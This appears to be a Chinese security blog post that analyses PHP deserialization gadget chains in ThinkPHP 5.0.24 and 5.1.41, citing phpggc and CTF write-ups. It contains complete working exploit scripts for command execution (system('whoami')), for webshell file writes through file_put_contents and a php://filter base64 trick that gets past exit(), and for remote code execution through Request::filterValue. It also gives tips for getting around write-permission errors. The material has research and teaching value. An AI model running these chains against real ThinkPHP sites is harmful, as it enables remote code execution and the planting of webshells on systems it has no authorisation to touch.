## 前言

本文将总结分析ThinkPHP5.0和5.1中的反序列化利用链，一方面以备不时之需，另一方面算是对php反序列化的深入学习。

其中TP5.0的利用链会复杂很多，所以本文会先介绍TP5.1的利用链。本文主要分析的代码是ThinkPHP5.0.24和ThinkPHP5.1.41，分别是ThinkPHP5.0和5.1的最终版本

因为tp5.0的利用链比较复杂，如果只对pop链利用感兴趣的话可以直接看每小节的 **简介** 和 **exp构造**
部分，如果有人想查看代码的分析部分，建议跟着一起debug

## ThinkPHP5.1的pop链

参考：

ThinkPHP/RCE/1
https://github.com/ambionics/phpggc/tree/master/gadgetchains/ThinkPHP/RCE/1
2019-9

Thinkphp v5.1.41反序列化漏洞分析及EXP：https://www.freebuf.com/vuls/269882.html

### 代码分析

该条pop链入口在`think\process\pipes\Windows`类中，利用`__destruct()`触发

在`file_exists($filename)`时，可触发`__toString()`魔术方法，从而可以跳入下一个文件

    
    
    //		thinkphp/library/think/process/pipes/Windows.php
    class Windows extends Pipes
    {
      	private $files = [];
        public function __destruct()
        {
            $this->close();
            $this->removeFiles();
        }
        private function removeFiles()
        {
            foreach ($this->files as $filename) {
                if (file_exists($filename)) {
                    @unlink($filename);
                }
            }
            $this->files = [];
        }
    }
    

寻找`__toString()`的跳板找到了`think\model\concern\Conversion`类，其中找到了`__toString>>>toJson()>>>toArray()>>>getAttr()>>>$closure($value,
$this->data)`的利用链

    
    
    //		thinkphp/library/think/model/concern/Conversion.php
    trait Conversion
    {
    		public function __toString()
        {
            return $this->toJson();
        }
      	public function toJson($options = JSON_UNESCAPED_UNICODE)
        {
            return json_encode($this->toArray(), $options);
        }
      	public function toArray()
        {
          	$hasVisible = false;
          	$data = array_merge($this->data, $this->relation);
          	foreach ($data as $key => $val) {
              	……
                } elseif (!isset($this->hidden[$key]) && !$hasVisible) {
                    $item[$key] = $this->getAttr($key);
                }
            }
         		……
        }
        public function getAttr($name, &$item = null)
        {
            try {
                $value    = $this->getData($name);
            } catch (InvalidArgumentException $e) { …… }
          	$fieldName = Loader::parseName($name);
          	if (isset($this->withAttr[$fieldName])) {
              	$closure = $this->withAttr[$fieldName];
                $value   = $closure($value, $this->data);
            }
          	……
        }
    

该条pop链很简单，其实主要就是涉及这两个文件，但`Conversion`是一个trait，不能被实例化，所以我们需要找到一个use该trait的类。然后找到了`think\Model`类，但这是一个抽象类也不能被实例化，我们可以寻找一个继承该类的

    
    
    //	thinkphp/library/think/Model.php
    namespace think;
    abstract class Model implements \JsonSerializable, \ArrayAccess
    {
      	use model\concern\Conversion;
    

最终找到了`think\model\Privot`类

    
    
    namespace think\model;
    class Pivot extends Model
    

### exp构造

上面弄清了这条POP链的头尾，头是`__destruct()`，尾是`$closure($value, $this->data)`，然后细心去构造一波

### 命令执行

该条pop链最好构造的就是命令执行，可以忽略`$this->data`参数，poc如下

  * 最终执行的是`$function($parameter, $this->data)`

  * $this->data是多余的参数，在php中多余的参数会被函数忽略

    
    
    <?php
    namespace think{
        abstract class Model{
            private $withAttr = [];
            private $data = [];
            public function __construct($function,$parameter){
                $this->data['smi1e'] = $parameter;
                $this->withAttr['smi1e'] = $function;
            }
        }
    }
    
    namespace think\model{
        use think\Model;
        class Pivot extends Model
        {}
    }
    
    namespace think\process\pipes{
        use think\model\Pivot;
        class Windows
        {
            private $files = [];
            public function __construct($function,$parameter){
                $this->files = [new Pivot($function,$parameter)];
            }
        }
        $function = 'system';
        $parameter = 'whoami';
        $aaa = new Windows($function,$parameter);
        echo base64_encode(serialize($aaa));
    }
    

其中 smi1e 应该是最早发现此链作者的名称，respect！利用命令执行反弹shell感觉是一个不错的利用方式

### 写入文件

可能我们更习惯写入webshell，使用file_putcontens将会涉及到两个参数，上面多余的$this->data参数就有了作用，如下多添加一个`$this->data['jelly']`的值将会被写入到
1.php 中

    
    
    abstract class Model{
        private $withAttr = [];
        private $data = [];
        public function __construct(){
            $this->data['smi1e'] = '1.php';
            $this->data['jelly'] = '<?php phpinfo();?>';
            $this->withAttr['smi1e'] = 'file_put_contents';
        }
    }
    

>
> 这里有个需要注意的点，上面exp中smile要小写，在phpggc工具中该参数就大写了导致无法正常工作，因为该条pop链在执行过程中会把键名全部转换为小写后去寻找原来的键名，如果原来的键名是大写则可能找不到对应的键值。
>
>
> 我把该问题提交后，phpggc当天就做了修复，使用最新版phpggc应该就没有这个问题了：https://github.com/ambionics/phpggc/issues/114

## ThinkPHP5.0文件写入pop链

参考：

ThinkPHP v5.0.x 反序列化利用链挖掘：https://www.anquanke.com/post/id/196364 2020-1-07
该链要求文件名控制shell写入导致windows上用不了

Thinkphp5.0反序列化链在Windows下写文件的方法：https://xz.aliyun.com/t/7457 2020-3-31
用了比较复杂的过滤器

关于 ThinkPHP5.0 反序列化链的扩展：https://xz.aliyun.com/t/7310 2020-03-05

phpggc
ThinkPHP/FW：https://github.com/ambionics/phpggc/tree/master/gadgetchains/ThinkPHP/FW/1
2021-8-22

### 简述

tp 5.0.x目前也有一条 pop 链，入口和tp5.1的一样，但构造上比较麻烦，所以这里就把tp5.0放在5.1后面了

### 代码分析

### pop链入口

入口依然是Windows类的`__destruct()`函数，然后借助file_exists()触发`__toString()`

    
    
    //	thinkphp/library/think/process/pipes/Windows.php
    namespace think\process\pipes;
    use think\Process;
    class Windows extends Pipes
    {
      	public function __destruct()
        {
            $this->close();
            $this->removeFiles();
        }
      	private function removeFiles()
        {
            foreach ($this->files as $filename) {
                if (file_exists($filename)) {
                    @unlink($filename);
                }
            }
            $this->files = [];
        }
    }
    

### 新的跳板`__call()`

可以在`think\Model`类中找到可利用的`__toString()`方法

    
    
    //	thinkphp/library/think/Model.php
    namespace think;
    abstract class Model implements \JsonSerializable, \ArrayAccess
    {
    		public function __toString()
        {
            return $this->toJson();
        }
    		public function toJson($options = JSON_UNESCAPED_UNICODE)
        {
            return json_encode($this->toArray(), $options);
        }
      	public function toArray()
        {
          	// 代码太多，放截图中分析
          		$this->getAttr();
        }
      	public function getAttr($name)
        {
          	// 代码太多，放截图中分析
        }
    }
    

tp5.0的`think\Model`类和 tp5.1
中`think\model\concern\Conversion`类是差不多的，在tp5.1中**getAttr()**会造成`$closure($value,
$this->data);`的任意代码执行，在tp5.0中就找不到这样的代码了

![图片.png](https://image.3001.net/images/20211230/1640846072_61cd52f8bac907f963784.png!small)

如上图，`$this->$method()`这种使用格式，我还差点没弄明白，这个表示调用当前类的$method方法，并不能达到执行任意函数的目的

所以tp5.0中无法利用**getAttr() **方法了，回到**
toArray()**方法，其中有几个地方调用了其他类的方法，利用这一点，我们可以获取到一个`__call()`方法的跳板。怎么触发这几个方法这里先不管，我们下面先找下是否有可用的`__call()`跳板

![图片.png](https://image.3001.net/images/20211230/1640846128_61cd533005773fac1a621.png!small)

其实并不只这几个地方可以触发`__call()`，可以深入一些函数再找找，比如我就看到一条pop链深入了上面的`$this->getRelationData($modelRelation);`方法，然后找到了一处可以触发`__call()`的地方

其实并不只这几个地方可以触发`__call()`，可以深入一些函数再找找，比如我就看到一条pop链深入了上面的`$this->getRelationData($modelRelation);`方法，然后找到了一处可以触发`__call()`的地方

    
    
    //	thinkphp/library/think/Model.php
    public function toArray()
    {
    		$value	= $this->getRelationData($modelRelation);
    }
    protected function getRelationData(Relation $modelRelation)
    {
                $value = $modelRelation->getRelation();
    }
    //	thinkphp/library/think/model/relation/BelongsTo.php
    public function getRelation($subRelation = '', $closure = null)
    {
      	// 	$this->query 可控，设置为output类，然后通过removeWhereField触发__call()
      	$relationModel = $this->query->removeWhereField($this->localKey)……
    }
    

### 文件写入利用点

可以在 **think\console\Output**
类中找到`__call()`的利用点，找到这样一条利用链：`__call()=>block()=>writeln()=>write()=>$this->handle->write()`

    
    
    //	thinkphp/library/think/console/Output.php
    namespace think\console;
    class Output
    {
      	public function __call($method, $args)
        {
            if (in_array($method, $this->styles)) {
                array_unshift($args, $method);
                return call_user_func_array([$this, 'block'], $args);
            }
    
            if ($this->handle && method_exists($this->handle, $method)) {
                return call_user_func_array([$this->handle, $method], $args);
            } else {
                throw new Exception('method not exists:' . __CLASS__ . '->' . $method);
            }
        }
      	protected function block($style, $message)
        {
            $this->writeln("<{$style}>{$message}</$style>");
        }
      	public function writeln($messages, $type = self::OUTPUT_NORMAL)
        {
            $this->write($messages, true, $type);
        }
      	public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
        {
            $this->handle->write($messages, $newline, $type);
        }
    }
    

最后调用的是`$this->handle->write()`，恰巧可以在 **think\session\driver\Memcache**
类找到可用的write()方法，然后又找到一个`$this->handler->set()`

    
    
    //	thinkphp/library/think/session/driver/Memcache.php
    namespace think\session\driver;
    class Memcache extends SessionHandler
    {
      	public function write($sessID, $sessData)
        {
            return $this->handler->set($this->config['session_name'] . $sessID, $sessData, 0, $this->config['expire']);
        }
    }
    

恰巧又在 **think\cache\driver\File**
类找到可利用的set()方法，这里的**file_put_contents()**可以实现写入文件。这里要注意传入set()的参数$value固定为true，$expire固定为0，可以回溯看一看。所以这里写入文件的内容$data并不可控。不过不要灰心，继续往下看，setTagItem()会再次调动set()方法，且传入set()的参数$value将等于$filename，而$filename与options['path']和第一次传入set()的参数$name相关，这是可控的。所以到这里，我们的pop链的尾部才算落实

    
    
    //	thinkphp/library/think/cache/driver/File.php
    namespace think\cache\driver;
    class File extends Driver
    {
      	public function set($name, $value, $expire = null)
        {
          	$filename = $this->getCacheKey($name, true);
          	$data = serialize($value);
          	$data   = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
          	$result = file_put_contents($filename, $data);
            if ($result) {
                isset($first) && $this->setTagItem($filename);
                ……
            }
        }
      	protected function getCacheKey($name, $auto = false)
        {
            $name = md5($name);
            $filename = $this->options['path'] . $name . '.php';
            return $filename;
        }
    }
    //	thinkphp/library/think/cache/Driver.php
    abstract class Driver
    {
      	protected function setTagItem($name)
        {
            if ($this->tag) {
                $key       = 'tag_' . md5($this->tag);
                $this->tag = null;
                if ($this->has($key)) { …… } else {
                    $value = $name;
                }
                $this->set($key, $value, 0);
            }
        }
    }
    

但师傅们很快就发现了问题，写入文件的内容来自文件名，但我们写入shell时总会写入一些特殊的符号，而操作系统对文件名的特殊符号都有限制，所以该条链注定利用方式有限

然后就有人找到了 **think\cache\driver\Memcached**
类的set()方法，中间绕一下使其写入内容的变量和文件名的变量分开，代码有点绕，感觉自己不能通过文字说清楚，如果要分析代码还是自己调试最清楚。这里就画了一个简单的流程图梳理一下逻辑，其中pop1是上面分析的，pop2是优化后的

![image](https://image.3001.net/images/20211230/1640846324_61cd53f48d13405f53eb8.png!small)

### 触发`__call()`

上面的分析我们把pop链的首尾都搞定了，只剩下一个问题，触发`__call()`这个跳板，这里需要精心构造一下

上面已经说到有4个方法可以触发`__call()`，但这里仔细看一下，如下代码所示的两个方法，法1$relation是通过getAttr()可以直接new实例化一个对象，如我们利用它实例化Output类，但Output类的构造函数比较有限，会导致我们无法控制Output类的一些关键属性，而
**我们在构造pop链代码时，是可以直接控制整个对象的属性，而new一个对象只能借助构造函数**
。我一开始以为通过new实例化Output类后就好利用了，忽略了这一点，不知道其他人会踩我这个坑不

而法2中$modelRelation可以通过pop链代码构造一个完全可控的Output类的对象，可这里$modelRelation->getBindAttr()触发`__call()`时会没有参数传入，所以法2也没法利用

    
    
    # 法1
    $relation   = $this->getAttr($key);
    $item[$key] = $relation->append($name)->toArray();
    function getAttr(){$value = new $type($value);return $value;}
    # 法2
    $modelRelation = $this->$relation();
    $bindAttr = $modelRelation->getBindAttr();
    

然后还剩下两种方法可以触发`__call()`。为了避免此文篇幅过于冗长，详细触发`__call()`的方式见参考和exp自己分析即可，这里只分析其它文章没有分析到的

### 坑点总结

该条pop链的诞生十分曲折，我这里总结下其中的一些坑点

  * convert.base64-decode 过滤器遇到等号报错的情况

我找到最早的pop链是利用 **think\session\driver\Memcache**
类，该条链写入的内容来自可控的文件名，但我们的文件名必须利用`php://filter/过滤器/resource=文件名`来绕过exit，这里的写入内容必定会有等号，会导致
**convert.base64-decode** 过滤器报错无法使用

> base64编码后，等号只能在字符串末尾

所以早期该pop链便使用string.rot13过滤器，exp为`<?cuc cucvasb();?>`即phpinfo()，生成的内容如下图：

![图片.png](https://image.3001.net/images/20211230/1640846374_61cd54262cb3eab531e87.png!small)

在访问时一定要把文件名中的问号做url编码

![图片.png](https://image.3001.net/images/20211230/1640846401_61cd5441e81306db1aae6.png!small)

该poc就有一些明显问题，windows中无法生成含有`<,?`等字符文件名的文件，导致该poc只能在linux上使用。而且文件内容中的`<?cuc`部分，可能会使php识别为不符合语法规则的php代码，导致报错退出执行

后面就有师傅提出了利用`convert.iconv.*`过滤器解决问题，具体见参考分析

最后我就找到了今年发的文章，在最后写入文件时，找到了 **think\cache\driver\Memcached** ，把文件名和内容依靠的变量分开

### exp 构造

  * 最终将会执行：file_put_contents($path, $data);

  * 其中$path最好就固定为下面所示的过滤器，且读取目录是当前目录，目的是为了让文件名固定

  * $data是写入文件的内容，需要base64编码，这里只需要检查编码后的内容是否存在等号，尽量构造一个无等号的$data

  * 该pop链上传的文件名将会固定

    
    
    <?php
    namespace think\process\pipes{
        use think\model\Pivot;
        use think\cache\driver\Memcached;
        class Windows{
            private $files = [];
            public function __construct($path,$data)
            {
                $this->files = [new Pivot($path,$data)];
            }
        }
        $data = base64_encode('<?php phpinfo();?>');
        echo "tp5.0.24 write file pop Chain\n";
        echo "The '=' cannot exist in the data,please check：".$data."\n";
        $path = 'php://filter/convert.base64-decode/resource=./';
        $aaa = new Windows($path,$data);
        echo base64_encode(serialize($aaa));
        echo "\n";
        echo 'filename:'.md5('tag_'.md5(true)).'.php';
    }
    namespace think{
        abstract class Model
        {}
    }
    namespace think\model{
        use think\Model;
        class Pivot extends Model
        {
            protected $append = [];
            protected $error;
            public $parent;
            public function __construct($path,$data)
            {
                $this->append['jelly'] = 'getError';
                $this->error = new relation\BelongsTo($path,$data);
                $this->parent = new \think\console\Output($path,$data);
            }
        }
        abstract class Relation
        {}
    }
    namespace think\model\relation{
        use think\db\Query;
        use think\model\Relation;
        abstract class OneToOne extends Relation
        {}
        class BelongsTo extends OneToOne
        {
            protected $selfRelation;
            protected $query;
            protected $bindAttr = [];
            public function __construct($path,$data)
            {
                $this->selfRelation = false;
                $this->query = new Query($path,$data);
                $this->bindAttr = ['a'.$data];
            }
        }
    }
    namespace think\db{
        use think\console\Output;
        class Query
        {
            protected $model;
            public function __construct($path,$data)
            {
                $this->model = new Output($path,$data);
            }
        }
    }
    namespace think\console{
        use think\session\driver\Memcache;
        class Output
        {
            protected $styles = [];
            private $handle;
            public function __construct($path,$data)
            {
                $this->styles = ['getAttr'];
                $this->handle = new Memcache($path,$data);
            }
        }
    }
    namespace think\session\driver{
        use think\cache\driver\File;
        use think\cache\driver\Memcached;
        class Memcache
        {
            protected $handler = null;
            protected $config  = [
                'expire'       => '',
                'session_name' => '',
            ];
            public function __construct($path,$data)
            {
                $this->handler = new Memcached($path,$data);
            }
        }
    }
    namespace think\cache\driver{
        class Memcached
        {
            protected $handler;
            protected $tag;
            protected $options = [];
            public function __construct($path,$data)
            {
                $this->options = ['prefix'   => ''];
                $this->handler = new File($path,$data);
                $this->tag = true;
            }
        }
    }
    namespace think\cache\driver{
        class File
        {
            protected $options = [];
            protected $tag;
            public function __construct($path,$data)
            {
                $this->tag = false;
                $this->options = [
                    'expire'        => 0,
                    'cache_subdir'  => false,
                    'prefix'        => '',
                    'path'          => $path,
                    'data_compress' => false,
                ];
            }
        }
    }
    

使用过程还要注意一下几点

  * 也可以填充Memcached::options['prefix']做为写入文件的内容，不过此时的文件将会和该变量相关，不再固定，所以考虑后还是没有使用这个

  * 这里绕过exit采用了convert.base64-decode过滤器，注意base64的解码规则是每4个字节为一组，所以我们的payload有可能被拆开分解导致无法正常写入，这时可以写入时多加几个a测试一下，这是在面对base64解码时的一些技巧，在这条链中就多加了一个a

  * convert.base64-decode过滤器会比base64_decode()函数严格，遇到字符串非末尾部分的等号会爆出`stream filter (convert.base64-decode): invalid byte sequence`的错误，所以在控制文件写入的内容时，我们 **尽量构造一个没有等号的payload**

另外该链有一个小技巧，可能会遇到当前目录没有写文件权限的问题，我本地测试是下面这种报错

![图片.png](https://image.3001.net/images/20211230/1640846460_61cd547c182dff7d0ea62.png!small)

但该pop链过程中有一个`mkdir($dir, 0755, true);`的代码，利用这个就可以生成一个有权限的目录。可以如下修改上面的exp

    
    
    # 第一步生成 ../test/ 目录
    $path = '../test/';
    $data = '111';
    # 第二步往新目录写内容,两步的data需要不一样
    $path = 'php://filter/convert.base64-decode/resource=../test/';
    $data = '<?php phpinfo();?>';
    

## ThinkPHP5.0 文件写入pop链另外一个入口

上面提到入口是 **think\process\pipes\Windows**
类的`__destruct()`，然后构造`__toString()=>__call()`跳板去利用 **think\console\Output**
类的block()方法，其中这个触发`__call()`的跳板需要精心构造，还是比较麻烦的，这里介绍另外一个入口，或许要简单一点

如下代码，在 **think/Process**
类可构造出`__destruct()---stop()---$this->processPipes->close()`，从而触发某个类的`__call()`方法，只可惜这里没有传入参数，而我们要利用的block()方法需要两个参数

    
    
    //	thinkphp/library/think/Process.php
    namespace think;
    class Process
    {
      	public function __destruct()
        {
            $this->stop();
        }
      	public function stop()
        {
            if ($this->processInformation['running']) {
                $this->close();
            }
        }
      	private function close()
    		{
            $this->processPipes->close();
         		……
    

不过只需要简单的构造以下，就能找到下一个`__call()`跳板

    
    
    //		thinkphp/library/think/model/Relation.php
    namespace think\model;
    abstract class Relation{
      	public function __call($method, $args){
            if ($this->query) {
                // 入
                $this->baseQuery();
              	……
            }
        }
    }
    //	thinkphp/library/think/model/relation/HasMany.php
    namespace think\model\relation;
    class HasMany extends Relation{
      	protected function baseQuery(){
            if (empty($this->baseQuery)) {
                if (isset($this->parent->{$this->localKey})) {
                    // $this->query = new think\console\Output
                    $this->query->where($this->foreignKey, $this->parent->{$this->localKey});
                }
                $this->baseQuery = true;
            }
        }
    }
    

### phpggc利用

ThinkPHP/FW1
用的就是这个入口，这里就不帖对应的pop链代码了，但要注意phpggc中存在一个问题，可以自己修改下代码，文件位置：phpggc/gadgetchains/ThinkPHP/FW/1/gadgets.php。该链的
**think\model\relation\HasMany**
类没有声明query的属性就直接使用了，而在tp5.0中，该属性被声明为protected变量。https://github.com/ambionics/phpggc/issues/113

具体修改如下图

![图片.png](https://image.3001.net/images/20211230/1640846511_61cd54afe511a82dc346c.png!small)

最终使用的命令如下：

    
    
    ./phpggc ThinkPHP/FW1  ./  						1.txt
    							写入的文件名，这里建议./		本地文件，里面保存者要写入的内容
    

## ThinkPHP5.0代码执行pop链

参考：

ThinkPHP 5.0.24 RCE POP Gadget
Chain：https://blog.hexens.io/thinkphp-5-0-24-rce-pop-gadget-chain-acbb62619b7c

phpggc
ThinkPHP/RCE2：https://github.com/ambionics/phpggc/commits/master/gadgetchains/ThinkPHP/RCE/2
2021年9月28日

2021 0CTF FINAL wp：https://igml.top/2021/09/28/2021-0CTF-FINAL/
2021年9月28日，清华大佬的wp！！！

### 简述

有些人喜欢写入文件，就有些人喜欢执行命令。tp5.0
的反序列化链的探索过程还是很有趣的，在2020年1月有博主就发了tp5.0的任意文件写入pop链，经过不断优化后有了不错的利用效果。在今年的0CTF中，一道名为RevengePHP的题目让大神们又挖出了tp5.0命令执行的pop链，实在感叹，只要大佬们想挖，啥漏洞找不到！

### 代码分析

让我们回到tp5.0文件写入pop链的Memcached.php部分，我们利用了`$this->handler->set()`调用了File.php中的set()方法，最终利用了file_put_contents()方法实现了一个文件写入的pop链调用

现在我们关注Memcached.php中的has()方法，其中会有一个`$this->handler->get()`，便可以尝试调用其他类的get()方法。不过敏感一点的小伙伴可能会立马想到tp5.0的一个rce漏洞中会涉及到get()方法

    
    
    //	thinkphp/library/think/cache/driver/Memcached.php
    class Memcached extends Driver
    {
    		public function set($name, $value, $expire = null)
        {
            if ($this->tag && !$this->has($name)) {
                $first = true;
            }
            if ($this->handler->set($key, $value, $expire)) {
                isset($first) && $this->setTagItem($key);
            }
        }
      	public function has($name)
        {
            $key = $this->getCacheKey($name);
            return $this->handler->get($key) ? true : false;
        }
    }
    

让我们来看看Request.php中的get()方法，一条熟悉的调用链就出现了，而且我们现在pop链利用，能控制所以类成员变量，现在这条rce链条似乎唾手可得。下面简单跟踪下变量走向

  * 传入get()的$name可控

  * get()将会调用input()，传入input()的$this->get,$name可控

  * input()将会调用filterValue()

  * filterValue()中$filter可来自getFilter()，其中又来自$this->filter可控

  * 最终调用call_user_func($filter,$value)，$value来自$this->get，最终可以执行任意代码

    
    
    //	thinkphp/library/think/Request.php
    class Request
    {
      	public function get($name = '', $default = null, $filter = '')
        {
            if (empty($this->get)) {
                $this->get = $_GET;
            }
            if (is_array($name)) {
                $this->param      = [];
                $this->mergeParam = false;
                return $this->get = array_merge($this->get, $name);
            }
            return $this->input($this->get, $name, $default, $filter);
        }
      	public function input($data = [], $name = '', $default = null, $filter = '')
        {
            $name = (string) $name;
            if (is_array($data)) {
                array_walk_recursive($data, [$this, 'filterValue'], $filter);
                reset($data);
            } else {
                $this->filterValue($data, $name, $filter);
            }
        }
      	private function filterValue(&$value, $key, $filters)
        {
          	$filter = $this->getFilter($filter, $default);
            foreach ($filters as $filter) {
                if (is_callable($filter)) {
                    // 调用函数或者方法过滤
                    $value = call_user_func($filter, $value);
                }
        }
        protected function getFilter($filter, $default)
        {
            if (is_null($filter)) {
                $filter = [];
            } else {
                $filter = $filter ?: $this->filter;
            }
            return $filter;
        }
    }
    

### exp构造

具体构造细节这里就不过细讲了，能分析到这一步，也不差那一点构造，直接贴上exp

  * 最终利用的是call_user_func($function,$parameter)，控制exp中对应参数即可

    
    
    <?php
    namespace think\process\pipes{
        use think\model\Pivot;
        ini_set('display_errors',1);
        class Windows{
            private $files = [];
            public function __construct($function,$parameter)
            {
                $this->files = [new Pivot($function,$parameter)];
            }
        }
        $aaa = new Windows('system','whoami');
        echo base64_encode(serialize($aaa));
    }
    namespace think{
        abstract class Model
        {}
    }
    namespace think\model{
        use think\Model;
        use think\console\Output;
        class Pivot extends Model
        {
            protected $append = [];
            protected $error;
            public $parent;
            public function __construct($function,$parameter)
            {
                $this->append['jelly'] = 'getError';
                $this->error = new relation\BelongsTo($function,$parameter);
                $this->parent = new Output($function,$parameter);
            }
        }
        abstract class Relation
        {}
    }
    namespace think\model\relation{
        use think\db\Query;
        use think\model\Relation;
        abstract class OneToOne extends Relation
        {}
        class BelongsTo extends OneToOne
        {
            protected $selfRelation;
            protected $query;
            protected $bindAttr = [];
            public function __construct($function,$parameter)
            {
                $this->selfRelation = false;
                $this->query = new Query($function,$parameter);
                $this->bindAttr = [''];
            }
        }
    }
    namespace think\db{
        use think\console\Output;
        class Query
        {
            protected $model;
            public function __construct($function,$parameter)
            {
                $this->model = new Output($function,$parameter);
            }
        }
    }
    namespace think\console{
        use think\session\driver\Memcache;
        class Output
        {
            protected $styles = [];
            private $handle;
            public function __construct($function,$parameter)
            {
                $this->styles = ['getAttr'];
                $this->handle = new Memcache($function,$parameter);
            }
        }
    }
    namespace think\session\driver{
        use think\cache\driver\Memcached;
        class Memcache
        {
            protected $handler = null;
            protected $config  = [
                'expire'       => '',
                'session_name' => '',
            ];
            public function __construct($function,$parameter)
            {
                $this->handler = new Memcached($function,$parameter);
            }
        }
    }
    namespace think\cache\driver{
        use think\Request;
        class Memcached
        {
            protected $handler;
            protected $options = [];
            protected $tag;
            public function __construct($function,$parameter)
            {
                // pop链中需要prefix存在，否则报错
                $this->options = ['prefix'   => 'jelly/'];
                $this->tag = true;
                $this->handler = new Request($function,$parameter);
            }
        }
    }
    namespace think{
        class Request
        {
            protected $get     = [];
            protected $filter;
            public function __construct($function,$parameter)
            {
                $this->filter = $function;
                $this->get = ["jelly"=>$parameter];
            }
        }
    }
    

调用栈：

    
    
    Windows.php: think\process\pipes\Windows->__destruct()
    Windows.php: think\process\pipes\Windows->removeFiles()
    Windows.php: file_exists()
    Model.php: think\model\Pivot->__toString()
    Model.php: think\model\Pivot->toJson()
    Model.php: think\model\Pivot->toArray()
    Model.php: $value->getAttr()
    Output.php: think\console\Output->__call()
    Output.php: think\console\Output->block()
    Output.php: think\console\Output->writlen()
    Output.php: think\console\Output->write()
    Output.php: think\console\Output->handle->write()
    Memcache.php: think\session\driver\Memcache->write()
    Memcache.php: think\session\driver\Memcache->handle->set()
    Memcached.php: think\cache\driver\Memcached->set()
    Memcached.php: think\cache\driver\Memcached->has()
    Memcached.php: think\cache\driver\Memcached->handler->get()
    Request.php: think\Request->get()
    Request.php: think\Request->input()
    Request.php: think\Request->filterValue()
    Request.php: call_user_func($filter, $value)
    

